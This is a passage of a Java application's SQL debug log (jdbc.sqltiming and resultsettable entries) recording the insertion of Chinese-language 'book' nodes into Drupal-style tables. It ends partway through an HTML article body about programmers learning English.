|----------|-------|------|-----------------|---------|------------|
|entity_id |bundle |delta |field_fsid_value |langcode |revision_id |
|----------|-------|------|-----------------|---------|------------|
|----------|-------|------|-----------------|---------|------------|

2020-11-19 11:05:45.216 INFO  jdbc.sqltiming Line:373 - insert into node_revision__field_fsid (bundle, delta, field_fsid_value, langcode, revision_id, 
entity_id) values ('book', 0, '1117935194302978', 'zh-hans', 12, 12) 
 {executed in 0 msec}
2020-11-19 11:05:45.220 INFO  jdbc.sqltiming Line:373 - select bookentity0_.nid as nid1_1_, bookentity0_.bid as bid2_1_, bookentity0_.depth as depth3_1_, 
bookentity0_.has_children as has_chil4_1_, bookentity0_.p1 as p5_1_, bookentity0_.p2 as p6_1_, 
bookentity0_.p3 as p7_1_, bookentity0_.p4 as p8_1_, bookentity0_.p5 as p9_1_, bookentity0_.pid 
as pid10_1_, bookentity0_.weight as weight11_1_ from book bookentity0_ where bookentity0_.nid=12 
 {executed in 1 msec}
2020-11-19 11:05:45.220 INFO  jdbc.resultsettable Line:610 - 
|----|----|------|-------------|---|---|---|---|---|----|-------|
|nid |bid |depth |has_children |p1 |p2 |p3 |p4 |p5 |pid |weight |
|----|----|------|-------------|---|---|---|---|---|----|-------|
|----|----|------|-------------|---|---|---|---|---|----|-------|

2020-11-19 11:05:45.221 INFO  jdbc.sqltiming Line:373 - select bookentity0_.nid as nid1_1_0_, bookentity0_.bid as bid2_1_0_, bookentity0_.depth as 
depth3_1_0_, bookentity0_.has_children as has_chil4_1_0_, bookentity0_.p1 as p5_1_0_, bookentity0_.p2 
as p6_1_0_, bookentity0_.p3 as p7_1_0_, bookentity0_.p4 as p8_1_0_, bookentity0_.p5 as p9_1_0_, 
bookentity0_.pid as pid10_1_0_, bookentity0_.weight as weight11_1_0_ from book bookentity0_ 
where bookentity0_.nid=12 
 {executed in 0 msec}
2020-11-19 11:05:45.221 INFO  jdbc.resultsettable Line:610 - 
|----|----|------|-------------|---|---|---|---|---|----|-------|
|nid |bid |depth |has_children |p1 |p2 |p3 |p4 |p5 |pid |weight |
|----|----|------|-------------|---|---|---|---|---|----|-------|
|----|----|------|-------------|---|---|---|---|---|----|-------|

2020-11-19 11:05:45.223 INFO  jdbc.sqltiming Line:373 - insert into book (bid, depth, has_children, p1, p2, p3, p4, p5, pid, weight, nid) values (1, 
2, 1, 1, 12, 0, 0, 0, 1, 0, 12) 
 {executed in 1 msec}
2020-11-19 11:05:45.227 INFO  jdbc.sqltiming Line:373 - select nodebodyen0_.entity_id as entity_i1_3_, nodebodyen0_.body_value as body_val2_3_, nodebodyen0_.body_summary 
as body_sum3_3_, nodebodyen0_.bundle as bundle4_3_, nodebodyen0_.delta as delta5_3_, nodebodyen0_.body_format 
as body_for6_3_, nodebodyen0_.langcode as langcode7_3_, nodebodyen0_.revision_id as revision8_3_ 
from node__body nodebodyen0_ where nodebodyen0_.entity_id=12 
 {executed in 0 msec}
2020-11-19 11:05:45.227 INFO  jdbc.resultsettable Line:610 - 
|----------|-----------|-------------|-------|------|------------|---------|------------|
|entity_id |body_value |body_summary |bundle |delta |body_format |langcode |revision_id |
|----------|-----------|-------------|-------|------|------------|---------|------------|
|----------|-----------|-------------|-------|------|------------|---------|------------|

2020-11-19 11:05:45.228 INFO  jdbc.sqltiming Line:373 - select nodebodyre0_.entity_id as entity_i1_12_0_, nodebodyre0_.body_value as body_val2_12_0_, 
nodebodyre0_.body_summary as body_sum3_12_0_, nodebodyre0_.bundle as bundle4_12_0_, nodebodyre0_.delta 
as delta5_12_0_, nodebodyre0_.body_format as body_for6_12_0_, nodebodyre0_.langcode as langcode7_12_0_, 
nodebodyre0_.revision_id as revision8_12_0_ from node_revision__body nodebodyre0_ where nodebodyre0_.entity_id=12 
 {executed in 0 msec}
2020-11-19 11:05:45.228 INFO  jdbc.resultsettable Line:610 - 
|----------|-----------|-------------|-------|------|------------|---------|------------|
|entity_id |body_value |body_summary |bundle |delta |body_format |langcode |revision_id |
|----------|-----------|-------------|-------|------|------------|---------|------------|
|----------|-----------|-------------|-------|------|------------|---------|------------|

2020-11-19 11:05:45.229 INFO  jdbc.sqltiming Line:373 - insert into node_revision__body (body_value, body_summary, bundle, delta, body_format, langcode, 
revision_id, entity_id) values ('', '', 'book', 0, 'full_html', 'zh-hans', 12, 12) 
 {executed in 0 msec}
2020-11-19 11:05:45.234 INFO  jdbc.sqltiming Line:373 - select nodebodyen0_.entity_id as entity_i1_3_0_, nodebodyen0_.body_value as body_val2_3_0_, 
nodebodyen0_.body_summary as body_sum3_3_0_, nodebodyen0_.bundle as bundle4_3_0_, nodebodyen0_.delta 
as delta5_3_0_, nodebodyen0_.body_format as body_for6_3_0_, nodebodyen0_.langcode as langcode7_3_0_, 
nodebodyen0_.revision_id as revision8_3_0_ from node__body nodebodyen0_ where nodebodyen0_.entity_id=12 
 {executed in 1 msec}
2020-11-19 11:05:45.234 INFO  jdbc.resultsettable Line:610 - 
|----------|-----------|-------------|-------|------|------------|---------|------------|
|entity_id |body_value |body_summary |bundle |delta |body_format |langcode |revision_id |
|----------|-----------|-------------|-------|------|------------|---------|------------|
|----------|-----------|-------------|-------|------|------------|---------|------------|

2020-11-19 11:05:45.235 INFO  jdbc.sqltiming Line:373 - insert into node__body (body_value, body_summary, bundle, delta, body_format, langcode, revision_id, 
entity_id) values ('', '', 'book', 0, 'full_html', 'zh-hans', 12, 12) 
 {executed in 0 msec}
2020-11-19 11:05:45.239 INFO  jdbc.sqltiming Line:373 - select nodefiledd0_.nid as nid1_9_, nodefiledd0_.changed as changed2_9_, nodefiledd0_.created 
as created3_9_, nodefiledd0_.default_langcode as default_4_9_, nodefiledd0_.langcode as langcode5_9_, 
nodefiledd0_.promote as promote6_9_, nodefiledd0_.revision_translation_affected as revision7_9_, 
nodefiledd0_.status as status8_9_, nodefiledd0_.sticky as sticky9_9_, nodefiledd0_.title as 
title10_9_, nodefiledd0_.type as type11_9_, nodefiledd0_.uid as uid12_9_, nodefiledd0_.vid 
as vid13_9_ from node_field_data nodefiledd0_ where nodefiledd0_.nid=12 
 {executed in 0 msec}
2020-11-19 11:05:45.239 INFO  jdbc.resultsettable Line:610 - 
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|
|nid |changed |created |default_langcode |langcode |promote |revision_translation_affected |status |sticky |title |type |uid |vid |
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|

2020-11-19 11:05:45.240 INFO  jdbc.sqltiming Line:373 - select nodefieldr0_.nid as nid1_10_0_, nodefieldr0_.changed as changed2_10_0_, nodefieldr0_.created 
as created3_10_0_, nodefieldr0_.default_langcode as default_4_10_0_, nodefieldr0_.langcode 
as langcode5_10_0_, nodefieldr0_.promote as promote6_10_0_, nodefieldr0_.revision_translation_affected 
as revision7_10_0_, nodefieldr0_.status as status8_10_0_, nodefieldr0_.sticky as sticky9_10_0_, 
nodefieldr0_.title as title10_10_0_, nodefieldr0_.uid as uid11_10_0_, nodefieldr0_.vid as vid12_10_0_ 
from node_field_revision nodefieldr0_ where nodefieldr0_.nid=12 
 {executed in 0 msec}
2020-11-19 11:05:45.240 INFO  jdbc.resultsettable Line:610 - 
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|----|----|
|nid |changed |created |default_langcode |langcode |promote |revision_translation_affected |status |sticky |title |uid |vid |
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|----|----|
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|----|----|

2020-11-19 11:05:45.241 INFO  jdbc.sqltiming Line:373 - insert into node_field_revision (changed, created, default_langcode, langcode, promote, revision_translation_affected, 
status, sticky, title, uid, vid, nid) values (1605755145, 1605755145, 1, 'zh-hans', 0, 1, 1, 
0, '05丨第五章 寻找最佳实践 (6讲)', 1, 12, 12) 
 {executed in 0 msec}
2020-11-19 11:05:45.248 INFO  jdbc.sqltiming Line:373 - select nodefiledd0_.nid as nid1_9_0_, nodefiledd0_.changed as changed2_9_0_, nodefiledd0_.created 
as created3_9_0_, nodefiledd0_.default_langcode as default_4_9_0_, nodefiledd0_.langcode as 
langcode5_9_0_, nodefiledd0_.promote as promote6_9_0_, nodefiledd0_.revision_translation_affected 
as revision7_9_0_, nodefiledd0_.status as status8_9_0_, nodefiledd0_.sticky as sticky9_9_0_, 
nodefiledd0_.title as title10_9_0_, nodefiledd0_.type as type11_9_0_, nodefiledd0_.uid as uid12_9_0_, 
nodefiledd0_.vid as vid13_9_0_ from node_field_data nodefiledd0_ where nodefiledd0_.nid=12 
 {executed in 0 msec}
2020-11-19 11:05:45.248 INFO  jdbc.resultsettable Line:610 - 
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|
|nid |changed |created |default_langcode |langcode |promote |revision_translation_affected |status |sticky |title |type |uid |vid |
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|

2020-11-19 11:05:45.250 INFO  jdbc.sqltiming Line:373 - insert into node_field_data (changed, created, default_langcode, langcode, promote, revision_translation_affected, 
status, sticky, title, type, uid, vid, nid) values (1605755145, 1605755145, 1, 'zh-hans', 0, 
1, 1, 0, '05丨第五章 寻找最佳实践 (6讲)', 'book', 1, 12, 12) 
 {executed in 1 msec}
2020-11-19 11:05:45.254 INFO  jdbc.sqltiming Line:373 - select bookfieldm0_.entity_id as entity_i1_7_, bookfieldm0_.bundle as bundle2_7_, bookfieldm0_.delta 
as delta3_7_, bookfieldm0_.langcode as langcode4_7_, bookfieldm0_.field_media_value as field_me5_7_, 
bookfieldm0_.revision_id as revision6_7_ from node__field_media bookfieldm0_ where bookfieldm0_.entity_id=12 
 {executed in 0 msec}
2020-11-19 11:05:45.254 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------------|------------|
|entity_id |bundle |delta |langcode |field_media_value |revision_id |
|----------|-------|------|---------|------------------|------------|
|----------|-------|------|---------|------------------|------------|

2020-11-19 11:05:45.255 INFO  jdbc.sqltiming Line:373 - select bookfieldm0_.entity_id as entity_i1_7_0_, bookfieldm0_.bundle as bundle2_7_0_, bookfieldm0_.delta 
as delta3_7_0_, bookfieldm0_.langcode as langcode4_7_0_, bookfieldm0_.field_media_value as 
field_me5_7_0_, bookfieldm0_.revision_id as revision6_7_0_ from node__field_media bookfieldm0_ 
where bookfieldm0_.entity_id=12 
 {executed in 0 msec}
2020-11-19 11:05:45.256 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------------|------------|
|entity_id |bundle |delta |langcode |field_media_value |revision_id |
|----------|-------|------|---------|------------------|------------|
|----------|-------|------|---------|------------------|------------|

2020-11-19 11:05:45.257 INFO  jdbc.sqltiming Line:373 - insert into node__field_media (bundle, delta, langcode, field_media_value, revision_id, entity_id) 
values ('book', 0, 'zh-hans', '', 12, 12) 
 {executed in 1 msec}
2020-11-19 11:05:45.259 INFO  jdbc.sqltiming Line:373 - select nodefieldm0_.entity_id as entity_i1_16_0_, nodefieldm0_.bundle as bundle2_16_0_, nodefieldm0_.delta 
as delta3_16_0_, nodefieldm0_.langcode as langcode4_16_0_, nodefieldm0_.field_media_value as 
field_me5_16_0_, nodefieldm0_.revision_id as revision6_16_0_ from node_revision__field_media 
nodefieldm0_ where nodefieldm0_.entity_id=12 
 {executed in 0 msec}
2020-11-19 11:05:45.260 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------------|------------|
|entity_id |bundle |delta |langcode |field_media_value |revision_id |
|----------|-------|------|---------|------------------|------------|
|----------|-------|------|---------|------------------|------------|

2020-11-19 11:05:45.261 INFO  jdbc.sqltiming Line:373 - insert into node_revision__field_media (bundle, delta, langcode, field_media_value, revision_id, 
entity_id) values ('book', 0, 'zh-hans', '', 12, 12) 
 {executed in 0 msec}
2020-11-19 11:05:45.265 INFO  jdbc.sqltiming Line:373 - select bookfieldc0_.entity_id as entity_i1_4_, bookfieldc0_.bundle as bundle2_4_, bookfieldc0_.field_comment_value 
as field_co3_4_, bookfieldc0_.delta as delta4_4_, bookfieldc0_.field_comment_format as field_co5_4_, 
bookfieldc0_.langcode as langcode6_4_, bookfieldc0_.revision_id as revision7_4_ from node__field_comment 
bookfieldc0_ where bookfieldc0_.entity_id=12 
 {executed in 1 msec}
2020-11-19 11:05:45.265 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|--------------------|------|---------------------|---------|------------|
|entity_id |bundle |field_comment_value |delta |field_comment_format |langcode |revision_id |
|----------|-------|--------------------|------|---------------------|---------|------------|
|----------|-------|--------------------|------|---------------------|---------|------------|

2020-11-19 11:05:45.266 INFO  jdbc.sqltiming Line:373 - select bookfieldc0_.entity_id as entity_i1_4_0_, bookfieldc0_.bundle as bundle2_4_0_, bookfieldc0_.field_comment_value 
as field_co3_4_0_, bookfieldc0_.delta as delta4_4_0_, bookfieldc0_.field_comment_format as 
field_co5_4_0_, bookfieldc0_.langcode as langcode6_4_0_, bookfieldc0_.revision_id as revision7_4_0_ 
from node__field_comment bookfieldc0_ where bookfieldc0_.entity_id=12 
 {executed in 0 msec}
2020-11-19 11:05:45.266 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|--------------------|------|---------------------|---------|------------|
|entity_id |bundle |field_comment_value |delta |field_comment_format |langcode |revision_id |
|----------|-------|--------------------|------|---------------------|---------|------------|
|----------|-------|--------------------|------|---------------------|---------|------------|

2020-11-19 11:05:45.267 INFO  jdbc.sqltiming Line:373 - insert into node__field_comment (bundle, field_comment_value, delta, field_comment_format, 
langcode, revision_id, entity_id) values ('book', '', 0, 'full_html', 'zh-hans', 12, 12) 
 {executed in 0 msec}
2020-11-19 11:05:45.270 INFO  jdbc.sqltiming Line:373 - select nodefieldc0_.entity_id as entity_i1_13_0_, nodefieldc0_.bundle as bundle2_13_0_, nodefieldc0_.field_comment_value 
as field_co3_13_0_, nodefieldc0_.delta as delta4_13_0_, nodefieldc0_.field_comment_format as 
field_co5_13_0_, nodefieldc0_.langcode as langcode6_13_0_, nodefieldc0_.revision_id as revision7_13_0_ 
from node_revision__field_comment nodefieldc0_ where nodefieldc0_.entity_id=12 
 {executed in 0 msec}
2020-11-19 11:05:45.271 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|--------------------|------|---------------------|---------|------------|
|entity_id |bundle |field_comment_value |delta |field_comment_format |langcode |revision_id |
|----------|-------|--------------------|------|---------------------|---------|------------|
|----------|-------|--------------------|------|---------------------|---------|------------|

2020-11-19 11:05:45.272 INFO  jdbc.sqltiming Line:373 - insert into node_revision__field_comment (bundle, field_comment_value, delta, field_comment_format, 
langcode, revision_id, entity_id) values ('book', '', 0, 'full_html', 'zh-hans', 12, 12) 
 {executed in 0 msec}
2020-11-19 11:05:45.275 INFO  jdbc.sqltiming Line:373 - select bookfieldt0_.entity_id as entity_i1_8_, bookfieldt0_.bundle as bundle2_8_, bookfieldt0_.delta 
as delta3_8_, bookfieldt0_.langcode as langcode4_8_, bookfieldt0_.revision_id as revision5_8_, 
bookfieldt0_.field_thumb_value as field_th6_8_ from node__field_thumb bookfieldt0_ where bookfieldt0_.entity_id=12 
 {executed in 0 msec}
2020-11-19 11:05:45.276 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------|------------------|
|entity_id |bundle |delta |langcode |revision_id |field_thumb_value |
|----------|-------|------|---------|------------|------------------|
|----------|-------|------|---------|------------|------------------|

2020-11-19 11:05:45.277 INFO  jdbc.sqltiming Line:373 - select bookfieldt0_.entity_id as entity_i1_8_0_, bookfieldt0_.bundle as bundle2_8_0_, bookfieldt0_.delta 
as delta3_8_0_, bookfieldt0_.langcode as langcode4_8_0_, bookfieldt0_.revision_id as revision5_8_0_, 
bookfieldt0_.field_thumb_value as field_th6_8_0_ from node__field_thumb bookfieldt0_ where 
bookfieldt0_.entity_id=12 
 {executed in 1 msec}
2020-11-19 11:05:45.277 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------|------------------|
|entity_id |bundle |delta |langcode |revision_id |field_thumb_value |
|----------|-------|------|---------|------------|------------------|
|----------|-------|------|---------|------------|------------------|

2020-11-19 11:05:45.278 INFO  jdbc.sqltiming Line:373 - insert into node__field_thumb (bundle, delta, langcode, revision_id, field_thumb_value, entity_id) 
values ('book', 0, 'zh-hans', 12, '', 12) 
 {executed in 0 msec}
2020-11-19 11:05:45.281 INFO  jdbc.sqltiming Line:373 - select nodefieldt0_.entity_id as entity_i1_17_0_, nodefieldt0_.bundle as bundle2_17_0_, nodefieldt0_.delta 
as delta3_17_0_, nodefieldt0_.langcode as langcode4_17_0_, nodefieldt0_.revision_id as revision5_17_0_, 
nodefieldt0_.field_thumb_value as field_th6_17_0_ from node_revision__field_thumb nodefieldt0_ 
where nodefieldt0_.entity_id=12 
 {executed in 0 msec}
2020-11-19 11:05:45.281 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------|------------------|
|entity_id |bundle |delta |langcode |revision_id |field_thumb_value |
|----------|-------|------|---------|------------|------------------|
|----------|-------|------|---------|------------|------------------|

2020-11-19 11:05:45.282 INFO  jdbc.sqltiming Line:373 - insert into node_revision__field_thumb (bundle, delta, langcode, revision_id, field_thumb_value, 
entity_id) values ('book', 0, 'zh-hans', 12, '', 12) 
 {executed in 0 msec}
2020-11-19 11:05:45.285 INFO  jdbc.sqltiming Line:373 - select bookfieldf0_.entity_id as entity_i1_5_0_, bookfieldf0_.bundle as bundle2_5_0_, bookfieldf0_.delta 
as delta3_5_0_, bookfieldf0_.field_fenlei_target_id as field_fe4_5_0_, bookfieldf0_.langcode 
as langcode5_5_0_, bookfieldf0_.revision_id as revision6_5_0_ from node__field_fenlei bookfieldf0_ 
where bookfieldf0_.entity_id=12 
 {executed in 0 msec}
2020-11-19 11:05:45.286 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------------|---------|------------|
|entity_id |bundle |delta |field_fenlei_target_id |langcode |revision_id |
|----------|-------|------|-----------------------|---------|------------|
|----------|-------|------|-----------------------|---------|------------|

2020-11-19 11:05:45.287 INFO  jdbc.sqltiming Line:373 - insert into node__field_fenlei (bundle, delta, field_fenlei_target_id, langcode, revision_id, 
entity_id) values ('book', 0, 1, 'zh-hans', 12, 12) 
 {executed in 0 msec}
2020-11-19 11:05:45.290 INFO  jdbc.sqltiming Line:373 - select nodefieldf0_.entity_id as entity_i1_14_0_, nodefieldf0_.bundle as bundle2_14_0_, nodefieldf0_.delta 
as delta3_14_0_, nodefieldf0_.field_fenlei_target_id as field_fe4_14_0_, nodefieldf0_.langcode 
as langcode5_14_0_, nodefieldf0_.revision_id as revision6_14_0_ from node_revision__field_fenlei 
nodefieldf0_ where nodefieldf0_.entity_id=12 
 {executed in 0 msec}
2020-11-19 11:05:45.291 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------------|---------|------------|
|entity_id |bundle |delta |field_fenlei_target_id |langcode |revision_id |
|----------|-------|------|-----------------------|---------|------------|
|----------|-------|------|-----------------------|---------|------------|

2020-11-19 11:05:45.292 INFO  jdbc.sqltiming Line:373 - insert into node_revision__field_fenlei (bundle, delta, field_fenlei_target_id, langcode, revision_id, 
entity_id) values ('book', 0, 1, 'zh-hans', 12, 12) 
 {executed in 0 msec}
2020-11-19 11:07:09.831 INFO  jdbc.sqltiming Line:373 - select bookfieldf0_.entity_id as entity_i1_6_, bookfieldf0_.bundle as bundle2_6_, bookfieldf0_.delta 
as delta3_6_, bookfieldf0_.field_fsid_value as field_fs4_6_, bookfieldf0_.langcode as langcode5_6_, 
bookfieldf0_.revision_id as revision6_6_ from node__field_fsid bookfieldf0_ where bookfieldf0_.field_fsid_value='403681561691227' 
 {executed in 1 msec}
2020-11-19 11:07:09.831 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------|---------|------------|
|entity_id |bundle |delta |field_fsid_value |langcode |revision_id |
|----------|-------|------|-----------------|---------|------------|
|----------|-------|------|-----------------|---------|------------|

2020-11-19 11:07:09.832 INFO  jdbc.sqltiming Line:373 - insert into node_revision (langcode, nid, revision_default, revision_timestamp, revision_uid) 
values ('zh-hans', 0, 1, 1605755229, 1) 
 {executed in 0 msec}
2020-11-19 11:07:09.833 INFO  jdbc.sqltiming Line:373 - getGeneratedKeys on query: insert into node_revision (langcode, nid, revision_default, revision_timestamp, 
revision_uid) values ('zh-hans', 0, 1, 1605755229, 1) 
 {executed in 0 msec}
2020-11-19 11:07:09.833 INFO  jdbc.resultsettable Line:610 - 
|--------------|
|generated_key |
|--------------|
|13            |
|--------------|

2020-11-19 11:07:09.841 INFO  jdbc.sqltiming Line:373 - insert into node (langcode, type, uuid, vid) values ('zh-hans', 'book', '0e1f4d9f-6834-428b-952e-c28d83df593f', 
13) 
 {executed in 0 msec}
2020-11-19 11:07:09.841 INFO  jdbc.sqltiming Line:373 - getGeneratedKeys on query: insert into node (langcode, type, uuid, vid) values ('zh-hans', 
'book', '0e1f4d9f-6834-428b-952e-c28d83df593f', 13) 
 {executed in 0 msec}
2020-11-19 11:07:09.842 INFO  jdbc.resultsettable Line:610 - 
|--------------|
|generated_key |
|--------------|
|13            |
|--------------|

2020-11-19 11:07:09.847 INFO  jdbc.sqltiming Line:373 - update node_revision set langcode='zh-hans', nid=13, revision_default=1, revision_timestamp=1605755229, 
revision_uid=1 where vid=13 
 {executed in 1 msec}
2020-11-19 11:07:09.851 INFO  jdbc.sqltiming Line:373 - select bookfieldf0_.entity_id as entity_i1_6_0_, bookfieldf0_.bundle as bundle2_6_0_, bookfieldf0_.delta 
as delta3_6_0_, bookfieldf0_.field_fsid_value as field_fs4_6_0_, bookfieldf0_.langcode as langcode5_6_0_, 
bookfieldf0_.revision_id as revision6_6_0_ from node__field_fsid bookfieldf0_ where bookfieldf0_.entity_id=13 
 {executed in 0 msec}
2020-11-19 11:07:09.851 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------|---------|------------|
|entity_id |bundle |delta |field_fsid_value |langcode |revision_id |
|----------|-------|------|-----------------|---------|------------|
|----------|-------|------|-----------------|---------|------------|

2020-11-19 11:07:09.852 INFO  jdbc.sqltiming Line:373 - insert into node__field_fsid (bundle, delta, field_fsid_value, langcode, revision_id, entity_id) 
values ('book', 0, '403681561691227', 'zh-hans', 13, 13) 
 {executed in 1 msec}
2020-11-19 11:07:09.856 INFO  jdbc.sqltiming Line:373 - select nodefieldf0_.entity_id as entity_i1_15_0_, nodefieldf0_.bundle as bundle2_15_0_, nodefieldf0_.delta 
as delta3_15_0_, nodefieldf0_.field_fsid_value as field_fs4_15_0_, nodefieldf0_.langcode as 
langcode5_15_0_, nodefieldf0_.revision_id as revision6_15_0_ from node_revision__field_fsid 
nodefieldf0_ where nodefieldf0_.entity_id=13 
 {executed in 1 msec}
2020-11-19 11:07:09.856 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------|---------|------------|
|entity_id |bundle |delta |field_fsid_value |langcode |revision_id |
|----------|-------|------|-----------------|---------|------------|
|----------|-------|------|-----------------|---------|------------|

2020-11-19 11:07:09.858 INFO  jdbc.sqltiming Line:373 - insert into node_revision__field_fsid (bundle, delta, field_fsid_value, langcode, revision_id, 
entity_id) values ('book', 0, '403681561691227', 'zh-hans', 13, 13) 
 {executed in 1 msec}
2020-11-19 11:07:09.862 INFO  jdbc.sqltiming Line:373 - select bookentity0_.nid as nid1_1_, bookentity0_.bid as bid2_1_, bookentity0_.depth as depth3_1_, 
bookentity0_.has_children as has_chil4_1_, bookentity0_.p1 as p5_1_, bookentity0_.p2 as p6_1_, 
bookentity0_.p3 as p7_1_, bookentity0_.p4 as p8_1_, bookentity0_.p5 as p9_1_, bookentity0_.pid 
as pid10_1_, bookentity0_.weight as weight11_1_ from book bookentity0_ where bookentity0_.nid=13 
 {executed in 0 msec}
2020-11-19 11:07:09.862 INFO  jdbc.resultsettable Line:610 - 
|----|----|------|-------------|---|---|---|---|---|----|-------|
|nid |bid |depth |has_children |p1 |p2 |p3 |p4 |p5 |pid |weight |
|----|----|------|-------------|---|---|---|---|---|----|-------|
|----|----|------|-------------|---|---|---|---|---|----|-------|

2020-11-19 11:07:09.863 INFO  jdbc.sqltiming Line:373 - select bookentity0_.nid as nid1_1_0_, bookentity0_.bid as bid2_1_0_, bookentity0_.depth as 
depth3_1_0_, bookentity0_.has_children as has_chil4_1_0_, bookentity0_.p1 as p5_1_0_, bookentity0_.p2 
as p6_1_0_, bookentity0_.p3 as p7_1_0_, bookentity0_.p4 as p8_1_0_, bookentity0_.p5 as p9_1_0_, 
bookentity0_.pid as pid10_1_0_, bookentity0_.weight as weight11_1_0_ from book bookentity0_ 
where bookentity0_.nid=13 
 {executed in 0 msec}
2020-11-19 11:07:09.864 INFO  jdbc.resultsettable Line:610 - 
|----|----|------|-------------|---|---|---|---|---|----|-------|
|nid |bid |depth |has_children |p1 |p2 |p3 |p4 |p5 |pid |weight |
|----|----|------|-------------|---|---|---|---|---|----|-------|
|----|----|------|-------------|---|---|---|---|---|----|-------|

2020-11-19 11:07:09.865 INFO  jdbc.sqltiming Line:373 - insert into book (bid, depth, has_children, p1, p2, p3, p4, p5, pid, weight, nid) values (1, 
3, 0, 1, 12, 13, 0, 0, 12, 0, 13) 
 {executed in 0 msec}
2020-11-19 11:07:09.869 INFO  jdbc.sqltiming Line:373 - select nodebodyen0_.entity_id as entity_i1_3_, nodebodyen0_.body_value as body_val2_3_, nodebodyen0_.body_summary 
as body_sum3_3_, nodebodyen0_.bundle as bundle4_3_, nodebodyen0_.delta as delta5_3_, nodebodyen0_.body_format 
as body_for6_3_, nodebodyen0_.langcode as langcode7_3_, nodebodyen0_.revision_id as revision8_3_ 
from node__body nodebodyen0_ where nodebodyen0_.entity_id=13 
 {executed in 0 msec}
2020-11-19 11:07:09.869 INFO  jdbc.resultsettable Line:610 - 
|----------|-----------|-------------|-------|------|------------|---------|------------|
|entity_id |body_value |body_summary |bundle |delta |body_format |langcode |revision_id |
|----------|-----------|-------------|-------|------|------------|---------|------------|
|----------|-----------|-------------|-------|------|------------|---------|------------|

2020-11-19 11:07:09.870 INFO  jdbc.sqltiming Line:373 - select nodebodyre0_.entity_id as entity_i1_12_0_, nodebodyre0_.body_value as body_val2_12_0_, 
nodebodyre0_.body_summary as body_sum3_12_0_, nodebodyre0_.bundle as bundle4_12_0_, nodebodyre0_.delta 
as delta5_12_0_, nodebodyre0_.body_format as body_for6_12_0_, nodebodyre0_.langcode as langcode7_12_0_, 
nodebodyre0_.revision_id as revision8_12_0_ from node_revision__body nodebodyre0_ where nodebodyre0_.entity_id=13 
 {executed in 0 msec}
2020-11-19 11:07:09.870 INFO  jdbc.resultsettable Line:610 - 
|----------|-----------|-------------|-------|------|------------|---------|------------|
|entity_id |body_value |body_summary |bundle |delta |body_format |langcode |revision_id |
|----------|-----------|-------------|-------|------|------------|---------|------------|
|----------|-----------|-------------|-------|------|------------|---------|------------|

2020-11-19 11:07:09.873 INFO  jdbc.sqltiming Line:373 - insert into node_revision__body (body_value, body_summary, bundle, delta, body_format, langcode, 
revision_id, entity_id) values ('<div data-slate-editor="true" data-key="2035" autocorrect="off" 
spellcheck="false" data-gramm="false" style="outline: none; white-space: pre-wrap; overflow-wrap: 
break-word;"> <div class="se-268562ad " data-slate-type="paragraph" data-slate-object="block" 
data-key="2036"> <span data-slate-object="text" data-key="2037"><span data-slate-leaf="true" 
data-offset-key="2037:0" data-first-offset="true"><span data-slate-string="true">你好，我是四火。</span></span></span> 
</div> <div class="se-082b6d4d " data-slate-type="paragraph" data-slate-object="block" data-key="2038"> 
<span data-slate-object="text" data-key="2039"><span data-slate-leaf="true" data-offset-key="2039:0" 
data-first-offset="true"><span data-slate-string="true">又到了相对轻松的特别放送时间，这一次，我想聊一聊程序员对于英语的学习。我在专栏最开始的 
</span></span></span><a data-slate-type="link" data-slate-object="inline" data-key="2040" class="se-d795ea91 
se-eb2c7cbb"><span data-slate-object="text" data-key="2041"><span data-slate-leaf="true" data-offset-key="2041:0" 
data-first-offset="true"><span data-slate-string="true">[学习路径]</span></span></span></a><span 
data-slate-object="text" data-key="2042"><span data-slate-leaf="true" data-offset-key="2042:0" 
data-first-offset="true"><span data-slate-string="true"> 中就提到了工程师的一些“基础”能力，比如数据结构和算法，当然也包括英语。当时我说，</span></span></span><span 
data-slate-object="text" data-key="2043"><span data-slate-leaf="true" data-offset-key="2043:0" 
data-first-offset="true"><span class="se-576941d3" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">对于进阶的工程师来说，英文能力是突破天花板的一个必选项</span></span></span></span><span data-slate-object="text" 
data-key="2044"><span data-slate-leaf="true" data-offset-key="2044:0" data-first-offset="true"><span 
data-slate-string="true">，而且英文是所有进阶的软件工程师应当强化的能力，对全栈工程师来说更甚。但是我在当时并没有展开论述，为什么在中文技术材料如此丰富的今天，在工作环境是以中文为主的情况下，英语的学习依然那么重要。</span></span></span> 
</div> <h2 class="se-fecf2dc4" data-slate-type="heading" data-slate-object="block" data-key="2045"><span 
data-slate-object="text" data-key="2046"><span data-slate-leaf="true" data-offset-key="2046:0" 
data-first-offset="true"><span data-slate-string="true">为什么英语是必选项？</span></span></span></h2> 
<div class="se-9d489007 " data-slate-type="paragraph" data-slate-object="block" data-key="2047"> 
<span data-slate-object="text" data-key="2048"><span data-slate-leaf="true" data-offset-key="2048:0" 
